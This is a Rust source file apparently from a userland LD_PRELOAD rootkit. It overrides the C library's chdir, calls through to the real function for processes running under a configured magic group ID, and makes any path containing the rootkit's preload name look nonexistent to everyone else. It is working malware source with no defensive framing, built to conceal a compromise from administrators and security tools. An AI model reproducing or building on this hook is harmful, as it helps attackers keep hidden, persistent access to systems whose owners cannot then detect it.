use libc::{getegid, c_char, c_int, c_void, ENOENT};
use errno::{Errno, set_errno};

use std::ffi::CStr;
use config::{GID, PRELOAD};

#[no_mangle]
pub extern "C" fn chdir(dir: *const c_char) -> c_int {
    let o_chdir: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"chdir\0".as_ptr() as *const _) };
    let o_chdir: extern "C" fn(*const c_char) -> c_int = unsafe { std::mem::transmute(o_chdir) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_chdir(dir);
    }

    if unsafe { CStr::from_ptr(dir).to_str().unwrap().contains(PRELOAD) } {
        set_errno(Errno(ENOENT));
        return -1
    }

    return o_chdir(dir);
}
